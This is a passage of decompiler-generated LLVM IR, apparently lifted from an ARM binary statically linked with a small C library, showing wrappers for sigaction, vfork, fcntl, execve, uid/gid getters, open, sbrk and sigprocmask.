  uselistorder i32 %v4_e660, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_1fe18.395, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 1, 2, 8, 5, 9, 3, 0, 7, 4, 6 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e7c0, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_e678, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_e848 = load i32, i32* @r4, align 4
  %v6_e848 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_e84c = icmp eq i32* %arg2, null
  %v2_e850 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_e84c, label %dec_label_pc_e8bc, label %dec_label_pc_e860

dec_label_pc_e860:                                ; preds = %entry
  %v2_e864 = load i32, i32* %arg2, align 4
  %v4_e864 = add i32 %tmp, 4
  store i32 %v4_e864, i32* @r1, align 4
  %v2_e868 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_e868, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_e864, i32* %stack_var_-156, align 4
  %v0_e874 = call i32 @memcpy()
  store i32 %v0_e874, i32* %r0.global-to-local, align 4
  %v0_e878 = load i32, i32* @r4, align 4
  %v1_e878 = add i32 %v0_e878, 132
  %v2_e878 = inttoptr i32 %v1_e878 to i32*
  %v3_e878 = load i32, i32* %v2_e878, align 4
  %v1_e87c = and i32 %v3_e878, 67108864
  %v2_e87c = icmp eq i32 %v1_e87c, 0
  br i1 %v2_e87c, label %dec_label_pc_e890, label %bb

bb:                                               ; preds = %dec_label_pc_e860
  br label %dec_label_pc_e8ac

dec_label_pc_e890:                                ; preds = %dec_label_pc_e860
  %v1_e898 = and i32 %v3_e878, 4
  %v2_e898 = icmp eq i32 %v1_e898, 0
  br i1 %v2_e898, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_e890
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_e890, %bb20
  br label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %bb, %bb21
  %v2_e8ac = icmp eq i32 %v0_e878, 0
  %v3_e8b0 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_e8b0 = select i1 %v2_e8ac, i32 0, i32 %v3_e8b0
  %v0_e8bc.pre = load i32, i32* @r5, align 4
  %v0_e8cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e8bc

dec_label_pc_e8bc:                                ; preds = %dec_label_pc_e8ac, %entry
  %v0_e8cc = phi i32 [ %arg1, %entry ], [ %v0_e8cc.pre, %dec_label_pc_e8ac ]
  %v0_e8bc = phi i32 [ %arg3, %entry ], [ %v0_e8bc.pre, %dec_label_pc_e8ac ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_e8b0, %dec_label_pc_e8ac ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_e8bc = icmp eq i32 %v0_e8bc, 0
  %.v2_e850 = select i1 %v2_e8bc, i32 0, i32 %v2_e850
  store i32 %.v2_e850, i32* @r2, align 4
  store i32 %v0_e8cc, i32* %r0.global-to-local, align 4
  %v1_e8d0 = call i32 @__syscall_rt_sigaction(i32 %v0_e8cc)
  store i32 %v1_e8d0, i32* %r0.global-to-local, align 4
  %v0_e8d4 = load i32, i32* @r5, align 4
  %v2_e8d4 = icmp eq i32 %v0_e8d4, 0
  br i1 %v2_e8d4, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_e8bc
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_e8bc, %bb25
  %v0_e8e4.pr = phi i32 [ 0, %dec_label_pc_e8bc ], [ 1, %bb25 ]
  %v1_e8dc = icmp slt i32 %v1_e8d0, 0
  br i1 %v1_e8dc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_e918

thread-pre-split:                                 ; preds = %bb26
  %v2_e8e4 = icmp eq i32 %v0_e8e4.pr, 0
  store i32 %v1_e8d0, i32* @r4, align 4
  br i1 %v2_e8e4, label %dec_label_pc_e918, label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %thread-pre-split
  %v2_e8f0 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_e8d4, i32* %r0.global-to-local, align 4
  %v2_e8f8 = inttoptr i32 %v0_e8d4 to i32*
  store i32 %v2_e8f0, i32* %v2_e8f8, align 4
  %v3_e8f8 = load i32, i32* %r0.global-to-local, align 4
  %v4_e8f8 = add i32 %v3_e8f8, 4
  store i32 %v4_e8f8, i32* @r0, align 4
  %v2_e8fc = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_e8fc, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_e904 = call i32 @memcpy()
  store i32 %v0_e904, i32* %r0.global-to-local, align 4
  %v1_e90c = load i32, i32* @r5, align 4
  %v2_e90c = add i32 %v1_e90c, 136
  %v3_e90c = inttoptr i32 %v2_e90c to i32*
  %v1_e914 = load i32, i32* @r5, align 4
  %v2_e914 = add i32 %v1_e914, 132
  %v3_e914 = inttoptr i32 %v2_e914 to i32*
  %v0_e918.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_e8f0
  %v0_e918 = phi i32 [ %v1_e8d0, %thread-pre-split ], [ %v0_e918.pre, %dec_label_pc_e8f0 ], [ %v1_e8d0, %thread-pre-split.thread ]
  store i32 %v0_e918, i32* %r0.global-to-local, align 4
  store i32 %v3_e848, i32* @r4, align 4
  store i32 %v6_e848, i32* @r5, align 4
  ret i32 %v0_e918

; uselistorder directives
  uselistorder i32 %v0_e918, { 1, 0 }
  uselistorder i32 %v0_e8d4, { 1, 0, 2 }
  uselistorder i32 %v0_e8cc, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder i32 67108864, { 1, 0 }
  uselistorder label %dec_label_pc_e918, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_e8ac, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e930 = call i32 @vfork()
  store i32 %v0_e930, i32* @r0, align 4
  %v2_e934 = icmp ugt i32 %v0_e930, -4097
  br i1 %v2_e934, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_e948, %entry
  %merge = phi i32 [ %v0_e930, %entry ], [ %v0_e948, %dec_label_pc_e948 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_e940 = icmp eq i32 %v0_e930, -38
  br i1 %v4_e940, label %dec_label_pc_e948, label %bb2

dec_label_pc_e948:                                ; preds = %bb1
  %v0_e948 = call i32 @fork()
  store i32 %v0_e948, i32* @r0, align 4
  %v2_e94c = icmp ugt i32 %v0_e948, -4097
  br i1 %v2_e94c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_e948
  %v0_e954 = call i32 @__syscall_error()
  ret i32 %v0_e954

; uselistorder directives
  uselistorder i32 %v0_e948, { 1, 2, 0 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_e960 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_e960
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_e964 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_e964
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_e968 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @ip, align 4
  %v1_e978 = add i32 %arg2, -12
  store i32 %v6_e968, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_e978, 2
  br i1 %tmp, label %dec_label_pc_e9a0, label %dec_label_pc_e998

dec_label_pc_e998:                                ; preds = %entry
  %v0_e998 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_e9cc

dec_label_pc_e9a0:                                ; preds = %entry
  %v2_e9a8 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_e9a8, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_e9a8, -4095
  br i1 %tmp8, label %dec_label_pc_e9cc, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9a0
  %v0_e9b8 = call i32 @__errno_location()
  %v0_e9bc = load i32, i32* %r4.global-to-local, align 4
  %v1_e9bc = sub i32 0, %v0_e9bc
  %v2_e9c0 = inttoptr i32 %v0_e9b8 to i32*
  store i32 %v1_e9bc, i32* %v2_e9c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e9cc

dec_label_pc_e9cc:                                ; preds = %dec_label_pc_e9b8, %dec_label_pc_e9a0, %dec_label_pc_e998
  %storemerge = phi i32 [ %v0_e998, %dec_label_pc_e998 ], [ %v2_e9a8, %dec_label_pc_e9a0 ], [ -1, %dec_label_pc_e9b8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_e9a8, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_e9fc = load i32, i32* @r0, align 4
  store i32 %v0_e9fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e9fc, -4095
  br i1 %tmp, label %dec_label_pc_ea18, label %dec_label_pc_ea08

dec_label_pc_ea08:                                ; preds = %entry
  %v0_ea08 = call i32 @__errno_location()
  %v0_ea0c = load i32, i32* %r4.global-to-local, align 4
  %v1_ea0c = sub i32 0, %v0_ea0c
  %v2_ea10 = inttoptr i32 %v0_ea08 to i32*
  store i32 %v1_ea0c, i32* %v2_ea10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %entry, %dec_label_pc_ea08
  %v0_ea18 = phi i32 [ %v0_e9fc, %entry ], [ -1, %dec_label_pc_ea08 ]
  ret i32 %v0_ea18

; uselistorder directives
  uselistorder i32 %v0_e9fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea18, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ea2c = load i32, i32* @r4, align 4
  store i32 %v3_ea2c, i32* %stack_var_-8, align 4
  %v1_ea30 = load i32, i32* @r1, align 4
  %v2_ea30 = inttoptr i32 %v1_ea30 to %sigaction*
  %v3_ea30 = load i32, i32* @r2, align 4
  %v4_ea30 = inttoptr i32 %v3_ea30 to %sigaction*
  %v5_ea30 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_ea30, %sigaction* %v4_ea30)
  store i32 %v5_ea30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_ea30, -4095
  br i1 %tmp, label %dec_label_pc_ea50, label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %entry
  %v0_ea40 = call i32 @__errno_location()
  %v0_ea44 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea44 = sub i32 0, %v0_ea44
  %v2_ea48 = inttoptr i32 %v0_ea40 to i32*
  store i32 %v1_ea44, i32* %v2_ea48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %entry, %dec_label_pc_ea40
  %v0_ea50 = phi i32 [ %v5_ea30, %entry ], [ -1, %dec_label_pc_ea40 ]
  %v2_ea54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ea54, i32* %r4.global-to-local, align 4
  ret i32 %v0_ea50

; uselistorder directives
  uselistorder i32 %v5_ea30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea50, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ea80 = load i32, i32* @r4, align 4
  store i32 %v3_ea80, i32* %stack_var_-8, align 4
  %v0_ea84 = load i32, i32* @r0, align 4
  %v1_ea84 = inttoptr i32 %v0_ea84 to i8*
  %v2_ea84 = load i32, i32* @r1, align 4
  %v3_ea84 = inttoptr i32 %v2_ea84 to i8*
  %v4_ea84 = insertvalue [1 x i8*] undef, i8* %v3_ea84, 0
  %v5_ea84 = load i32, i32* @r2, align 4
  %v6_ea84 = inttoptr i32 %v5_ea84 to i8*
  %v7_ea84 = insertvalue [1 x i8*] undef, i8* %v6_ea84, 0
  %v8_ea84 = call i32 @execve(i8* %v1_ea84, [1 x i8*] %v4_ea84, [1 x i8*] %v7_ea84)
  store i32 %v8_ea84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_ea84, -4095
  br i1 %tmp, label %dec_label_pc_eaa4, label %dec_label_pc_ea94

dec_label_pc_ea94:                                ; preds = %entry
  %v0_ea94 = call i32 @__errno_location()
  %v0_ea98 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea98 = sub i32 0, %v0_ea98
  %v2_ea9c = inttoptr i32 %v0_ea94 to i32*
  store i32 %v1_ea98, i32* %v2_ea9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eaa4

dec_label_pc_eaa4:                                ; preds = %entry, %dec_label_pc_ea94
  %v0_eaa4 = phi i32 [ %v8_ea84, %entry ], [ -1, %dec_label_pc_ea94 ]
  %v2_eaa8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_eaa8, i32* @r4, align 4
  ret i32 %v0_eaa4

; uselistorder directives
  uselistorder i32 %v8_ea84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eaa4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eaac = load i32, i32* @r4, align 4
  store i32 %v3_eaac, i32* %stack_var_-8, align 4
  %v0_eab4 = load i32, i32* @r0, align 4
  store i32 %v0_eab4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eab4, -4095
  br i1 %tmp, label %dec_label_pc_ead0, label %dec_label_pc_eac0

dec_label_pc_eac0:                                ; preds = %entry
  %v0_eac0 = call i32 @__errno_location()
  %v0_eac4 = load i32, i32* %r4.global-to-local, align 4
  %v1_eac4 = sub i32 0, %v0_eac4
  %v2_eac8 = inttoptr i32 %v0_eac0 to i32*
  store i32 %v1_eac4, i32* %v2_eac8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_ead4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ead0

dec_label_pc_ead0:                                ; preds = %entry, %dec_label_pc_eac0
  %v2_ead4 = phi i32 [ %v3_eaac, %entry ], [ %v2_ead4.pre, %dec_label_pc_eac0 ]
  %v0_ead0 = phi i32 [ %v0_eab4, %entry ], [ -1, %dec_label_pc_eac0 ]
  store i32 %v2_ead4, i32* @r4, align 4
  ret i32 %v0_ead0

; uselistorder directives
  uselistorder i32 %v0_eab4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ead0, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ead8 = load i32, i32* @r4, align 4
  store i32 %v3_ead8, i32* %stack_var_-8, align 4
  %v0_eae0 = load i32, i32* @r0, align 4
  store i32 %v0_eae0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eae0, -4095
  br i1 %tmp, label %dec_label_pc_eafc, label %dec_label_pc_eaec

dec_label_pc_eaec:                                ; preds = %entry
  %v0_eaec = call i32 @__errno_location()
  %v0_eaf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_eaf0 = sub i32 0, %v0_eaf0
  %v2_eaf4 = inttoptr i32 %v0_eaec to i32*
  store i32 %v1_eaf0, i32* %v2_eaf4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_eb00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_eafc

dec_label_pc_eafc:                                ; preds = %entry, %dec_label_pc_eaec
  %v2_eb00 = phi i32 [ %v3_ead8, %entry ], [ %v2_eb00.pre, %dec_label_pc_eaec ]
  %v0_eafc = phi i32 [ %v0_eae0, %entry ], [ -1, %dec_label_pc_eaec ]
  store i32 %v2_eb00, i32* @r4, align 4
  ret i32 %v0_eafc

; uselistorder directives
  uselistorder i32 %v0_eae0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eafc, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eb04 = load i32, i32* @r4, align 4
  store i32 %v3_eb04, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_eb28, label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %entry
  %v0_eb18 = call i32 @__errno_location()
  %v0_eb1c = load i32, i32* %r4.global-to-local, align 4
  %v1_eb1c = sub i32 0, %v0_eb1c
  %v2_eb20 = inttoptr i32 %v0_eb18 to i32*
  store i32 %v1_eb1c, i32* %v2_eb20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_eb2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_eb28

dec_label_pc_eb28:                                ; preds = %entry, %dec_label_pc_eb18
  %v2_eb2c = phi i32 [ %v3_eb04, %entry ], [ %v2_eb2c.pre, %dec_label_pc_eb18 ]
  %v0_eb28 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_eb18 ]
  store i32 %v2_eb2c, i32* %r4.global-to-local, align 4
  ret i32 %v0_eb28

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb28, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eb30 = load i32, i32* @r4, align 4
  store i32 %v3_eb30, i32* %stack_var_-8, align 4
  %v0_eb38 = load i32, i32* @r0, align 4
  store i32 %v0_eb38, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eb38, -4095
  br i1 %tmp, label %dec_label_pc_eb54, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %entry
  %v0_eb44 = call i32 @__errno_location()
  %v0_eb48 = load i32, i32* %r4.global-to-local, align 4
  %v1_eb48 = sub i32 0, %v0_eb48
  %v2_eb4c = inttoptr i32 %v0_eb44 to i32*
  store i32 %v1_eb48, i32* %v2_eb4c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_eb58.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_eb54

dec_label_pc_eb54:                                ; preds = %entry, %dec_label_pc_eb44
  %v2_eb58 = phi i32 [ %v3_eb30, %entry ], [ %v2_eb58.pre, %dec_label_pc_eb44 ]
  %v0_eb54 = phi i32 [ %v0_eb38, %entry ], [ -1, %dec_label_pc_eb44 ]
  store i32 %v2_eb58, i32* %r4.global-to-local, align 4
  ret i32 %v0_eb54

; uselistorder directives
  uselistorder i32 %v0_eb38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb54, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_eb5c = load i32, i32* @r4, align 4
  store i32 %v3_eb5c, i32* %stack_var_-8, align 4
  %v6_eb60 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_eb60, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_eb60, -4095
  br i1 %tmp6, label %dec_label_pc_eb80, label %dec_label_pc_eb70

dec_label_pc_eb70:                                ; preds = %entry
  %v0_eb70 = call i32 @__errno_location()
  %v0_eb74 = load i32, i32* %r4.global-to-local, align 4
  %v1_eb74 = sub i32 0, %v0_eb74
  %v2_eb78 = inttoptr i32 %v0_eb70 to i32*
  store i32 %v1_eb74, i32* %v2_eb78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %entry, %dec_label_pc_eb70
  %v0_eb80 = phi i32 [ %v6_eb60, %entry ], [ -1, %dec_label_pc_eb70 ]
  %v2_eb84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_eb84, i32* %r4.global-to-local, align 4
  ret i32 %v0_eb80

; uselistorder directives
  uselistorder i32 %v6_eb60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb80, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_eb98 = and i32 %arg2, 64
  %v2_eb98 = icmp eq i32 %v1_eb98, 0
  br i1 %v2_eb98, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_eb88 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_eb88, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_eba8 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_eba8, i32* @r2, align 4
  %v4_ebb0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_ebb4 = icmp eq i32 %v4_ebb0, -4096
  store i1 %v7_ebb4, i1* @cpsr_z, align 1
  store i32 %v4_ebb0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ebb0, -4095
  br i1 %tmp, label %dec_label_pc_ebd0, label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %.thread1
  %v0_ebc0 = call i32 @__errno_location()
  %v0_ebc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_ebc4 = sub i32 0, %v0_ebc4
  %v2_ebc8 = inttoptr i32 %v0_ebc0 to i32*
  store i32 %v1_ebc4, i32* %v2_ebc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %.thread1, %dec_label_pc_ebc0
  %v0_ebd0 = phi i32 [ %v4_ebb0, %.thread1 ], [ -1, %dec_label_pc_ebc0 ]
  ret i32 %v0_ebd0

; uselistorder directives
  uselistorder i32 %v4_ebb0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_ebd0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_ebec = load i32, i32* @r0, align 4
  %v2_ebec = inttoptr i32 %v0_ebec to i8*
  %v3_ebec = call i32 @__libc_open(i8* %v2_ebec, i32 577)
  %v0_ebf0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ebf0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_ebf0 = and i32 %v3_ebec, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_ebf0 = phi i32 [ %v3_ebec, %entry ], [ %v6_ebf0, %bb ]
  ret i32 %v7_ebf0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @__libc_open, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ebf4 = load i32, i32* @r4, align 4
  store i32 %v3_ebf4, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1fe4c.660 to i32), i32* %r4.global-to-local, align 4
  %v2_ebfc = load i32, i32* @global_var_1fe4c.660, align 4
  %v2_ec00 = icmp eq i32 %v2_ebfc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_ec00, label %dec_label_pc_ec10, label %dec_label_pc_ec1c

dec_label_pc_ec10:                                ; preds = %entry
  %v2_ec10 = call i32 @__GI_brk(i32* null)
  %v1_ec14 = icmp slt i32 %v2_ec10, 0
  br i1 %v1_ec14, label %dec_label_pc_ec3c, label %dec_label_pc_ec1cthread-pre-split

dec_label_pc_ec1cthread-pre-split:                ; preds = %dec_label_pc_ec10
  %v0_ec20.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_ec1c.pre = load i32, i32* @global_var_1fe4c.660, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ec1cthread-pre-split, %entry
  %v2_ec1c = phi i32 [ %v2_ec1c.pre, %dec_label_pc_ec1cthread-pre-split ], [ %v2_ebfc, %entry ]
  %v1_ec28 = phi i32 [ %v0_ec20.pr, %dec_label_pc_ec1cthread-pre-split ], [ %arg1, %entry ]
  %v2_ec20 = icmp eq i32 %v1_ec28, 0
  store i32 %v2_ec1c, i32* %r4.global-to-local, align 4
  br i1 %v2_ec20, label %dec_label_pc_ec40, label %dec_label_pc_ec30

dec_label_pc_ec30:                                ; preds = %dec_label_pc_ec1c
  %v2_ec28 = add i32 %v1_ec28, %v2_ec1c
  %v1_ec30 = inttoptr i32 %v2_ec28 to i32*
  %v2_ec30 = call i32 @__GI_brk(i32* %v1_ec30)
  %v1_ec34 = icmp slt i32 %v2_ec30, 0
  br i1 %v1_ec34, label %dec_label_pc_ec3c, label %dec_label_pc_ec30.dec_label_pc_ec40_crit_edge

dec_label_pc_ec30.dec_label_pc_ec40_crit_edge:    ; preds = %dec_label_pc_ec30
  %v0_ec40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec40

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec30, %dec_label_pc_ec10
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec40

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ec30.dec_label_pc_ec40_crit_edge, %dec_label_pc_ec1c, %dec_label_pc_ec3c
  %v0_ec40 = phi i32 [ %v0_ec40.pre, %dec_label_pc_ec30.dec_label_pc_ec40_crit_edge ], [ %v2_ec1c, %dec_label_pc_ec1c ], [ -1, %dec_label_pc_ec3c ]
  %v2_ec44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ec44, i32* @r4, align 4
  ret i32 %v0_ec40

; uselistorder directives
  uselistorder i32 %v2_ec1c, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_ec40, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ec4c = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_ec4c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_ec545 = load i32, i32* @r4, align 4
  store i32 %v3_ec545, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ec74

bb:                                               ; preds = %entry
  %v3_ec54 = load i32, i32* @r4, align 4
  store i32 %v3_ec54, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_ec74, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %bb
  %v0_ec60 = call i32 @__errno_location()
